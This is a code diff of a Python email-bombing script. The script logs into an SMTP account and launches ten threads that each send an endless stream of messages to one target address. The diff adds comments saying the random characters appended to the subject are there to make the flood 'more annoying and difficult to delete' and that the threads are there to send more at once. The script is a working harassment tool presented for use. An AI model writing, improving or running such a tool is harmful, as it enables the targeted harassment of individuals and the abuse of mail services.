@@ -5,6 +5,7 @@ from email.mime.multipart import MIMEMultipart
     
 def spam(email, passw, target, subject, msg):
     try:
+        #To make it more annoying
         characters = []
         lower = string.ascii_lowercase
         upper = string.ascii_uppercase
@@ -16,8 +17,9 @@ def spam(email, passw, target, subject, msg):
         for i in digit:
             characters.append(i)
         while True:
+            #Creating the message
             message = MIMEMultipart("alternative")
-            message["Subject"] = subject+"        "+characters[random.randint(0,len(characters)-1)]
+            message["Subject"] = subject+" "+characters[random.randint(0,len(characters)-1)]#This makes it more annoying and difficult to delete the messages
             message["From"] = email
             message["To"] = target
             emailsent = MIMEText(msg, "plain")
@@ -28,7 +30,7 @@ def spam(email, passw, target, subject, msg):
             context = ssl.create_default_context()
             with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
                 server.login(email, passw)
-                server.sendmail(email, target, message.as_string())
+                server.sendmail(email, target, message.as_string())#sending the email
                 server.quit()
                 print("\rEmail sent!", end="\r")
                 time.sleep(3)
@@ -52,7 +54,7 @@ if __name__ == "__main__":
         print("{} doesmt exists".format(sys.argv[0]))
         quit()
     subject = input("Subject: ")
-    print("Spamming started\nInfo:\nFrom: {}\nTo: {}\nSubject:{}\nEmail:\n{}".format(email, target, subject, msg))
+    print("Spamming started\nInfo:\nFrom: {}\nTo: {}\nSubject:{}\nEmail: {}".format(email, target, subject, msg))
     for i in range(10):
         t = threading.Thread(target=spam, args=(email, passw, target,subject, msg))
-        t.start()
+        t.start() #using multiple threads to send more messages at the same time
